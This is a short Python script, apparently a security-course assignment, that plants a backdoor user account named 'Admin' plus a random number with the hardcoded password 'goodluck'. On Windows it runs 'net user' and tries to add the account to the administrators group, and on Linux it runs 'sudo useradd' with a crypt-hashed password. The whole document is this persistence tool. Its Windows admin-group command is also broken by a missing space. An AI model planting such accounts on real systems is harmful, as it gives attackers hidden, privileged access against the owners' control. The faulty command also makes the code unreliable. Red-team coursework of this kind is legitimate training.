#Author: Dexter Delandro
#CSEC 473 - Spring 2022

import os
import platform
import random

#Sets the created uer's username and password to these variabels
name = "Admin"
password = "goodluck"

#adds a random number at the end of the username to reduce chance of duplicate users
username = name + str(random.randint(0,1000))

#if os is windows we need to use the net command
if platform.system() == 'Windows':
    os.system('net user ' + username + ' goodluck /add')
    os.system('net localgroup administrators' + username + ' /add')
elif platform.system() == 'Linux':
    # if os is linux we need to use the useradd command

    #we need to import crypt after we check if os is linux because
    #build will fail if Windows OS tries to import crypt 
    import crypt

    #need to use crypt to encrypt the password, can't pass in password as plaintext
    encryptedPass = crypt.crypt(password, "22")
    os.system('sudo useradd -p ' + encryptedPass + " " + username)
